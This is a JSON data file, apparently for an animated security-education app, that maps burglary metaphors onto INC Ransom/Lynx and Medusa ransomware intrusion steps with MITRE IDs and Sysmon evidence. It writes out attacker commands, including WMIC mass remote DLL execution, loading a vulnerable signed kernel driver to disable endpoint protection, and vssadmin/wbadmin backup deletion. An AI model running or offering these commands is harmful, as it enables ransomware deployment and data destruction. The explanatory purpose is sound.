      "storyCue": "Slipping past an unpatched edge access gateway into the corporate interior, the crew runs a swift floor scanner to chart every active room and uploads stolen corporate files directly to an outside consumer cloud locker.",
      "technicalCue": "T1046 · CREDENTIAL ACCESS — Pivoting from an exploited Citrix NetScaler ADC or VPN appliance, INC Ransom/Lynx operators enumerate all active domain computers into C:\\Windows\\Temp\\hosts.txt using netscan.exe and exfiltrate…",
      "storyMappings": [
        {
          "storyTerm": "Unpatched edge access gateway",
          "technicalTerm": "Exploited Citrix NetScaler ADC or VPN perimeter appliance",
          "tone": "amber"
        },
        {
          "storyTerm": "Swift floor scanner charting every active room",
          "technicalTerm": "NetScan discovering live hosts, shares, and IP lists saved to hosts.txt",
          "tone": "sky"
        },
        {
          "storyTerm": "Outside consumer cloud locker",
          "technicalTerm": "MEGASync client exfiltrating staged corporate documents to Mega.nz",
          "tone": "rose"
        },
        {
          "storyTerm": "Dual-brand criminal family",
          "technicalTerm": "Shared INC Ransom and Lynx codebase and affiliate playbooks",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-inc-lynx-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Unpatched edge access gateway",
          "subtitle": "Exploited Citrix NetScaler ADC or VPN perimeter appliance",
          "tone": "amber"
        },
        {
          "id": "ran-inc-lynx-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Swift floor scanner charting every…",
          "subtitle": "NetScan discovering live hosts, shares, and IP lists saved to…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Edge",
          "stageTag": "STEP 01 · SETUP",
          "title": "Unpatched edge access gateway",
          "storyExcerpt": "Slipping past an unpatched edge access gateway into the corporate interior, the crew runs a swift floor scanner to chart every active room and uploads stolen corporate files directly to an…",
          "technicalParallel": "Under the hood, the observed step executes netscan.exe /range:10.10.0.1-10.10.255.254 /save:C:\\Windows\\Temp\\hosts.txt (which executes the technical command / telemetry directive , netscan.exe…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Room",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Swift floor scanner charting every active room",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses swift floor scanner charting every active room to advance toward outside consumer cloud locker.",
          "technicalParallel": "Pivoting from an exploited Citrix NetScaler ADC or VPN appliance, INC Ransom/Lynx operators enumerate all active domain computers into C:\\Windows\\Temp\\hosts.txt using netscan.exe and exfiltrate sensitive…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Dual-brand",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Dual-brand criminal family",
          "storyExcerpt": "Behind the scenes, dual-brand criminal family captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 22 (recording ExfiltrationClient=MEGAcmdServer.exe / MEGASync.exe, DestinationDomain=g.api.mega.co.nz, TargetHostList=C:\\Windows\\Temp\\hosts.txt under T1046): Block outbound…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Edge Gateway",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Note Printer",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1046"
    },
    "step-2": {
      "scenarioId": "inc-ransom-lynx-citrix-netscaler-wmic-mega",
      "sectionKey": "step-2",
      "sceneKind": "ran-inc-lynx-step-2",
      "stageBadge": "STEP #2 · LATERAL & C2",
      "title": "Mass WMIC /node:@\"hosts.txt\" DLL Distribution & rundll32.exe Execution",
      "storyCue": "Holding a neat roster of every room number in the building, the operator copies a compact padlocking cartridge into each room temporary closet and uses the building built-in remote runner to trigger every cartridge across the entire roster in one single command.",
      "technicalCue": "T1047 · LATERAL & C2 — After copying the ransomware DLL (inc.dll or lynx.dll) to \\\\<host>\\C$\\Windows\\Temp\\ across every IP in hosts.txt, the operator executes a single wmic.exe command that remotely spawns…",
      "storyMappings": [
        {
          "storyTerm": "Neat roster of every room number",
          "technicalTerm": "Target host list hosts.txt fed into WMIC /node:@\"hosts.txt\"",
          "tone": "amber"
        },
        {
          "storyTerm": "Compact padlocking cartridge placed in each closet",
          "technicalTerm": "inc.dll or lynx.dll copied to \\\\<host>\\C$\\Windows\\Temp\\",
          "tone": "sky"
        },
        {
          "storyTerm": "Built-in remote runner triggering every cartridge",
          "technicalTerm": "WMIC process call create invoking signed rundll32.exe to execute the DLL",
          "tone": "rose"
        },
        {
          "storyTerm": "Single-command fleet-wide launch",
          "technicalTerm": "Rapid horizontal detonation across Windows workstations and servers",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-inc-lynx-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Neat roster of every room number",
          "subtitle": "Target host list hosts.txt fed into WMIC /node:@\"hosts.txt\"",
          "tone": "amber"
        },
        {
          "id": "ran-inc-lynx-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Compact padlocking cartridge placed in…",
          "subtitle": "inc.dll or lynx.dll copied to \\\\<host>\\C$\\Windows\\Temp\\",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Neat Room",
          "stageTag": "STEP 02 · SETUP",
          "title": "Neat roster of every room number",
          "storyExcerpt": "Holding a neat roster of every room number in the building, the operator copies a compact padlocking cartridge into each room temporary closet and uses the building built-in remote runner to…",
          "technicalParallel": "Under the hood, the observed step executes wmic.exe /node:@\"C:\\Windows\\Temp\\hosts.txt\" /user:\"CORP\\DomainAdmin\" /password:\"*\" process call create \"rundll32.exe C:\\Windows\\Temp\\inc.dll,Main --fast\" (which…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Each",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Compact padlocking cartridge placed in each closet",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses compact padlocking cartridge placed in each closet to advance toward built-in remote runner triggering every cartridge.",
          "technicalParallel": "After copying the ransomware DLL (inc.dll or lynx.dll) to \\\\<host>\\C$\\Windows\\Temp\\ across every IP in hosts.txt, the operator executes a single wmic.exe command that remotely spawns rundll32.exe on…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Neat Room",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Single-command fleet-wide launch",
          "storyExcerpt": "Behind the scenes, single-command fleet-wide launch captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording MassDeploymentCommand=wmic.exe /node:@\"hosts.txt\" process call create, DllLoader=rundll32.exe C:\\Windows\\Temp\\inc.dll,Main, MitreTechnique=T1047 , WMI + T1218.011…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Edge Gateway",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Note Printer",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1047"
    },
    "step-3": {
      "scenarioId": "inc-ransom-lynx-citrix-netscaler-wmic-mega",
      "sectionKey": "step-3",
      "sceneKind": "ran-inc-lynx-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "AES-128-CTR + Curve25519 Encryption, Wallpaper Change & Network Printer Ransom Notes",
      "storyCue": "As modern elliptical-key padlocks clamp down on every document, the crew flips every monitor screen to a stark warning banner and even sends their ransom letter straight to every networked paper printer in the hallways so nobody can miss the takeover.",
      "technicalCue": "T1486 · EXFIL & IMPACT — Both INC Ransom and Lynx encrypt files using AES-128-CTR paired with Curve25519 elliptic-curve key exchange (.INC or .LYNX), change the Windows desktop wallpaper to the ransom notice, and call…",
      "storyMappings": [
        {
          "storyTerm": "Modern elliptical-key padlocks",
          "technicalTerm": "AES-128-CTR symmetric file encryption paired with Curve25519 key exchange",
          "tone": "amber"
        },
        {
          "storyTerm": "Stark warning banner across every monitor",
          "technicalTerm": "Automated Windows desktop wallpaper replacement announcing compromise",
          "tone": "sky"
        },
        {
          "storyTerm": "Ransom letters pouring out of hallway paper printers",
          "technicalTerm": "Physical network printer job dispatch printing extortion notices on paper",
          "tone": "rose"
        },
        {
          "storyTerm": "Shared cryptographic DNA",
          "technicalTerm": "Identical encryption workflow shared between INC Ransom and its Lynx rebrand",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-inc-lynx-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Modern elliptical-key padlocks",
          "subtitle": "AES-128-CTR symmetric file encryption paired with Curve25519…",
          "tone": "amber"
        },
        {
          "id": "ran-inc-lynx-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Stark warning banner across every monitor",
          "subtitle": "Automated Windows desktop wallpaper replacement announcing…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Down Crew",
          "stageTag": "STEP 03 · SETUP",
          "title": "Modern elliptical-key padlocks",
          "storyExcerpt": "As modern elliptical-key padlocks clamp down on every document, the crew flips every monitor screen to a stark warning banner and even sends their ransom letter straight to every networked…",
          "technicalParallel": "Under the hood, the observed step executes rundll32.exe C:\\Windows\\Temp\\lynx.dll,Main (AES-128-CTR + Curve25519 encryption -> *.LYNX & README.txt) (which executes Microsoft's signed rundll32.exe host…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Out",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Stark warning banner across every monitor",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses stark warning banner across every monitor to advance toward ransom letters pouring out of hallway paper printers.",
          "technicalParallel": "Both INC Ransom and Lynx encrypt files using AES-128-CTR paired with Curve25519 elliptic-curve key exchange (.INC or .LYNX), change the Windows desktop wallpaper to the ransom notice, and call…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Down Crew",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Shared cryptographic DNA",
          "storyExcerpt": "Behind the scenes, shared cryptographic dna captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 11 (recording RansomwareFamily=INC Ransom / Lynx , Shared C++ Source Code, PrinterExtortion=EnumPrintersW + WritePrinter physical ransom note printing, EncryptedExtension=.INC…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Edge Gateway",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Note Printer",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1486"
    }
  },
  "medusa-ransomware-gaze-abyss-pdqdeploy": {
    "briefing": {
      "scenarioId": "medusa-ransomware-gaze-abyss-pdqdeploy",
      "sectionKey": "briefing",
      "sceneKind": "ran-medusa-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Medusa Ransomware: ScreenConnect RMM, gaze.exe (ThrottleStop.sys) Kernel… — Story-to-Technical Overview",
      "storyCue": "Imagine a burglary crew that slips into an office building through an unpatched remote-support console, maps every room with an ordinary floor scanner and trucks data out via cloud sync, pulls a signed laptop-cooling utility out of its bag to blind every security camera in the building core, and then hijacks the company own official software-delivery trolley to roll its padlocking crew into every office simultaneously.",
      "technicalCue": "INITIAL ACCESS: ScreenConnect RMM Foothold, Advanced IP Scanner & Rclone Exfiltration -> DEFENSE EVASION: `gaze.exe` Loading Signed `ThrottleStop.sys` (`rwdrv.sys`) to Blind Kernel Callbacks -> LATERAL & C2: PDQ Deploy Mass Distribution, VSS Deletion & `.medusa` AES-256-CBC Encryption",
      "storyMappings": [
        {
          "storyTerm": "Slipping in via remote-support console and trucking data out",
          "technicalTerm": "ScreenConnect RMM foothold, Advanced IP Scanner discovery, and Rclone exfiltration",
          "tone": "amber"
        },
        {
          "storyTerm": "Signed laptop-cooling utility blinding security cameras in the core",
          "technicalTerm": "gaze.exe loading signed ThrottleStop.sys (rwdrv.sys) to strip kernel EDR callbacks",
          "tone": "sky"
        },
        {
          "storyTerm": "Hijacking the company own official software-delivery trolley",
          "technicalTerm": "PDQ Deploy (PDQDeployConsole.exe) or psexec.exe -s mass ransomware rollout",
          "tone": "rose"
        },
        {
          "storyTerm": "Wiping backups and sealing every office with branded locks",
          "technicalTerm": "VSS deletion and AES-256-CBC encryption appending .medusa extensions",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#22D3EE",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-medusa-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Slipping in via remote-support console…",
          "subtitle": "ScreenConnect RMM foothold, Advanced IP Scanner discovery, and…",
          "tone": "amber"
        },
        {
          "id": "ran-medusa-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Signed laptop-cooling utility blinding…",
          "subtitle": "gaze.exe loading signed ThrottleStop.sys (rwdrv.sys) to strip…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Data Out",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "ScreenConnect RMM Foothold, Advanced IP Scanner & Rclone Exfiltration",
          "storyExcerpt": "Entering through an unpatched perimeter remote-support doorway, the crew runs an off-the-shelf network scanner to map every room in the building and quietly uploads sensitive company folders through a…",
          "technicalParallel": "Under the hood, the observed step executes C:\\Program Files (x86)\\ScreenConnect Client\\ScreenConnect.ClientService.exe (which executes the technical command / telemetry directive , C:\\Program Files…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Tool",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "`gaze.exe` Loading Signed `ThrottleStop.sys` (`rwdrv.sys`) to Blind Kernel Callbacks",
          "storyExcerpt": "Before rolling out the padlocking crew, the intruders drop a specialized guard-killer carrying a legitimately signed laptop-tuning driver, using its raw core access to cut the security cameras master…",
          "technicalParallel": "Under the hood, the observed step executes sc.exe create rwdrv binPath= \"C:\\Windows\\Temp\\rwdrv.sys\" type= kernel && sc.exe start rwdrv (which executes the technical command / telemetry directive , sc.exe…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. It Cart",
          "stageTag": "STAGE 03 · LATERAL & C2",
          "title": "PDQ Deploy Mass Distribution, VSS Deletion & `.medusa` AES-256-CBC Encryption",
          "storyExcerpt": "Climbing aboard the IT department own official software-deployment cart, the crew broadcasts the Medusa padlocking machine across the entire campus at once, shredding shadow backups and snapping branded…",
          "technicalParallel": "Under the hood, the observed step executes vssadmin.exe Delete Shadows /all /quiet && wbadmin.exe delete catalog -quiet (which executes vssadmin.exe delete shadows /all /quiet , or WMI…",
          "accentHex": "#22D3EE",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Driver Core",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Deploy Cart",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Medusa Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "medusa-ransomware-gaze-abyss-pdqdeploy",
      "sectionKey": "step-1",
      "sceneKind": "ran-medusa-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "ScreenConnect RMM Foothold, Advanced IP Scanner & Rclone Exfiltration",
      "storyCue": "Entering through an unpatched perimeter remote-support doorway, the crew runs an off-the-shelf network scanner to map every room in the building and quietly uploads sensitive company folders through a cloud moving utility before sounding any alarms.",
      "technicalCue": "T1190 · INITIAL ACCESS — Following initial exploitation of unpatched perimeter web/VPN services (such as ConnectWise ScreenConnect or Fortinet EMS), Medusa operators install persistent RMM clients…",
      "storyMappings": [
        {
          "storyTerm": "Unpatched perimeter remote-support doorway",
          "technicalTerm": "Exploited ConnectWise ScreenConnect or Fortinet perimeter appliance",
          "tone": "amber"
        },
        {
          "storyTerm": "Off-the-shelf room scanner",
          "technicalTerm": "Advanced IP Scanner mapping active internal servers and SMB shares",
          "tone": "sky"
        },
        {
          "storyTerm": "Cloud moving utility shipping out folders",
          "technicalTerm": "Rclone exfiltrating sensitive corporate archives prior to ransomware execution",
          "tone": "rose"
        },
        {
          "storyTerm": "Dual-purpose remote access",
          "technicalTerm": "Living-off-the-land RMM persistence blending into legitimate IT operations",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-medusa-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Unpatched perimeter remote-support doorway",
          "subtitle": "Exploited ConnectWise ScreenConnect or Fortinet perimeter…",
          "tone": "amber"
        },
        {
          "id": "ran-medusa-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Off-the-shelf room scanner",
          "subtitle": "Advanced IP Scanner mapping active internal servers and SMB…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Crew Runs",
          "stageTag": "STEP 01 · SETUP",
          "title": "Unpatched perimeter remote-support doorway",
          "storyExcerpt": "Entering through an unpatched perimeter remote-support doorway, the crew runs an off-the-shelf network scanner to map every room in the building and quietly uploads sensitive company folders…",
          "technicalParallel": "Under the hood, the observed step executes C:\\Program Files (x86)\\ScreenConnect Client\\ScreenConnect.ClientService.exe (which executes the technical command / telemetry directive , C:\\Program Files…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Off-the-shelf",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Off-the-shelf room scanner",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses off-the-shelf room scanner to advance toward cloud moving utility shipping out folders.",
          "technicalParallel": "Following initial exploitation of unpatched perimeter web/VPN services (such as ConnectWise ScreenConnect or Fortinet EMS), Medusa operators install persistent RMM clients…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Dual-purpose",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Dual-purpose remote access",
          "storyExcerpt": "Behind the scenes, dual-purpose remote access captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording MasqueradedBinary=C:\\Windows\\Temp\\svchost.exe , OriginalFileName: rclone.exe, RmmPersistence=ConnectWise ScreenConnect Client, AdvisoryId=CISA AA25-071A under…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Driver Core",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Deploy Cart",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Medusa Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "medusa-ransomware-gaze-abyss-pdqdeploy",
      "sectionKey": "step-2",
      "sceneKind": "ran-medusa-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "gaze.exe Loading Signed ThrottleStop.sys (rwdrv.sys) to Blind Kernel Callbacks",
      "storyCue": "Before rolling out the padlocking crew, the intruders drop a specialized guard-killer carrying a legitimately signed laptop-tuning driver, using its raw core access to cut the security cameras master notification wires.",
      "technicalCue": "T1562.001 · DEFENSE EVASION — To neutralize endpoint protection before mass deployment, Medusa drops gaze.exe (also known as Abyss Locker / Medusa killer) alongside ThrottleStop.sys (renamed rwdrv.sys, CVE-2025-7771).…",
      "storyMappings": [
        {
          "storyTerm": "Specialized guard-killer tool",
          "technicalTerm": "gaze.exe (Abyss Locker / Medusa EDR killer wrapper)",
          "tone": "amber"
        },
        {
          "storyTerm": "Legitimately signed laptop-tuning driver",
          "technicalTerm": "Vulnerable signed ThrottleStop.sys / rwdrv.sys kernel driver (BYOVD)",
          "tone": "sky"
        },
        {
          "storyTerm": "Cutting security cameras master notification wires",
          "technicalTerm": "Patching or wiping Ring-0 kernel EDR callback arrays to blind telemetry",
          "tone": "rose"
        },
        {
          "storyTerm": "Unmonitored network ready for mass deployment",
          "technicalTerm": "Disabled endpoint protection across domain servers and workstations",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-medusa-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Specialized guard-killer tool",
          "subtitle": "gaze.exe (Abyss Locker / Medusa EDR killer wrapper)",
          "tone": "amber"
        },
        {
          "id": "ran-medusa-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Legitimately signed laptop-tuning driver",
          "subtitle": "Vulnerable signed ThrottleStop.sys / rwdrv.sys kernel driver…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Tool",
          "stageTag": "STEP 02 · SETUP",
          "title": "Specialized guard-killer tool",
          "storyExcerpt": "Before rolling out the padlocking crew, the intruders drop a specialized guard-killer carrying a legitimately signed laptop-tuning driver, using its raw core access to cut the security cameras…",
          "technicalParallel": "Under the hood, the observed step executes sc.exe create rwdrv binPath= \"C:\\Windows\\Temp\\rwdrv.sys\" type= kernel && sc.exe start rwdrv (which executes the technical command / telemetry directive , sc.exe…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Legitimately signed laptop-tuning driver",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses legitimately signed laptop-tuning driver to advance toward cutting security cameras master notification wires.",
          "technicalParallel": "To neutralize endpoint protection before mass deployment, Medusa drops gaze.exe (also known as Abyss Locker / Medusa killer) alongside ThrottleStop.sys (renamed rwdrv.sys, CVE-2025-7771). gaze.exe uses…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Mass",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Unmonitored network ready for mass deployment",
          "storyExcerpt": "Behind the scenes, unmonitored network ready for mass deployment captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 6 (recording EdrKillerTool=gaze.exe , Medusa Kernel Callback Wiper, VulnerableDriver=rwdrv.sys , ThrottleStop.sys physical memory R/W…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Driver Core",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Deploy Cart",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Medusa Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1562.001"
    },
    "step-3": {
      "scenarioId": "medusa-ransomware-gaze-abyss-pdqdeploy",
      "sectionKey": "step-3",
      "sceneKind": "ran-medusa-step-3",
      "stageBadge": "STEP #3 · LATERAL & C2",
      "title": "PDQ Deploy Mass Distribution, VSS Deletion & .medusa AES-256-CBC Encryption",
      "storyCue": "Climbing aboard the IT department own official software-deployment cart, the crew broadcasts the Medusa padlocking machine across the entire campus at once, shredding shadow backups and snapping branded padlocks across every document.",
      "technicalCue": "T1072 · LATERAL & C2 — Using PDQ Deploy (PDQDeployConsole.exe) or psexec.exe -s, the operator pushes the Medusa encryptor (gaze.exe / medusa.exe) across all domain hosts.",
      "storyMappings": [
        {
          "storyTerm": "IT department official software-deployment cart",
          "technicalTerm": "Abused PDQ Deploy (PDQDeployConsole.exe) or psexec.exe -s mass distribution",
          "tone": "amber"
        },
        {
          "storyTerm": "Shredding shadow backups across the campus",
          "technicalTerm": "Volume Shadow Copy (VSS) deletion blocking native Windows file recovery",
          "tone": "sky"
        },
        {
          "storyTerm": "Branded padlocks snapped across every document",
          "technicalTerm": "Medusa AES-256-CBC encryption renaming files with the .medusa extension",
          "tone": "rose"
        },
        {
          "storyTerm": "Coordinated single-wave impact",
          "technicalTerm": "Simultaneous domain-wide detonation maximizing operational disruption",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-medusa-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "IT department official…",
          "subtitle": "Abused PDQ Deploy (PDQDeployConsole.exe) or psexec.exe -s mass…",
          "tone": "amber"
        },
        {
          "id": "ran-medusa-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Shredding shadow backups across the campus",
          "subtitle": "Volume Shadow Copy (VSS) deletion blocking native Windows file…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. It Cart",
          "stageTag": "STEP 03 · SETUP",
          "title": "IT department official software-deployment cart",
          "storyExcerpt": "Climbing aboard the IT department own official software-deployment cart, the crew broadcasts the Medusa padlocking machine across the entire campus at once, shredding shadow backups and…",
          "technicalParallel": "Under the hood, the observed step executes vssadmin.exe Delete Shadows /all /quiet && wbadmin.exe delete catalog -quiet (which executes vssadmin.exe delete shadows /all /quiet , or WMI…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Shredding shadow backups across the campus",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses shredding shadow backups across the campus to advance toward branded padlocks snapped across every document.",
          "technicalParallel": "Using PDQ Deploy (PDQDeployConsole.exe) or psexec.exe -s, the operator pushes the Medusa encryptor (gaze.exe / medusa.exe) across all domain hosts.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. It Own",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Coordinated single-wave impact",
          "storyExcerpt": "Behind the scenes, coordinated single-wave impact captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 11 (recording DistributionMechanism=PDQ Deploy / PsExec Domain Push, RansomNote=!!!READ_ME_MEDUSA!!!.txt, EncryptedExtension=.medusa under T1072): Require tiered administrative…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
